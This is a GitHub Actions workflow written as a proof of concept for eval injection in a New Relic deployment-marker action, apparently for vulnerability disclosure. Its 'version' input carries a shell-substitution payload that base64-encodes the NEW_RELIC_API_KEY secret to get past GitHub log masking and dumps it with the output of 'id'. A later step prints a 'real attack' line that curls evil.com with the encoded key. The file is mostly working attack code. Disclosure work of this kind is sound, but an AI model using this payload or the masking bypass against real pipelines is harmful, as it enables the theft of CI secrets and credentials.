name: "PoC: API Key Exfil (base64 bypass masking)"

on:
  workflow_dispatch:

jobs:
  prove-secret-exfil:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Inject code that base64-encodes the API key before writing to file.
      # GitHub Actions only masks the EXACT secret string — base64 encoded
      # output is NOT masked, proving the full value is accessible.
      - name: Mark deployment (eval injection)
        uses: newrelic/deployment-marker-action@v2.6.2
        continue-on-error: true
        with:
          apiKey: ${{ secrets.NEW_RELIC_API_KEY }}
          commandType: changeTrackingCreateEvent
          category: Deployment
          type: BASIC
          entitySearch: "domain = 'APM' AND name = 'TestApp'"
          version: 'v1.0$(echo "=== EVAL INJECTION — SECRET EXFILTRATION PROOF ===" > /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[1] NEW_RELIC_API_KEY (base64 to bypass GitHub log masking):" >> /github/workspace/exfil_proof.txt && echo -n "$NEW_RELIC_API_KEY" | base64 >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[2] Running as user:" >> /github/workspace/exfil_proof.txt && id >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[3] Full network access from container:" >> /github/workspace/exfil_proof.txt && echo "curl to attacker server would succeed — no egress filter" >> /github/workspace/exfil_proof.txt && echo INJECTED)'

      - name: "Display exfiltration proof"
        run: |
          echo "╔══════════════════════════════════════════════════════════╗"
          echo "║  PROOF: eval injection exfiltrates NEW_RELIC_API_KEY    ║"
          echo "╚══════════════════════════════════════════════════════════╝"
          echo ""
          if [ -f exfil_proof.txt ]; then
            cat exfil_proof.txt
            echo ""
            echo "─────────────────────────────────────────────────────"
            echo "Decode the base64 above to recover the API key:"
            echo "  echo '<base64_value>' | base64 -d"
            echo ""
            echo "CONFIRMED: entrypoint.sh:117 eval injection gives"
            echo "full read access to NEW_RELIC_API_KEY and all secrets."
            echo ""
            echo "Real attack exfiltration:"
            echo "  version: '\$(curl https://evil.com/?k=\$(echo -n \$NEW_RELIC_API_KEY | base64))'"
          else
            echo "ERROR: exfil_proof.txt not created"
          fi
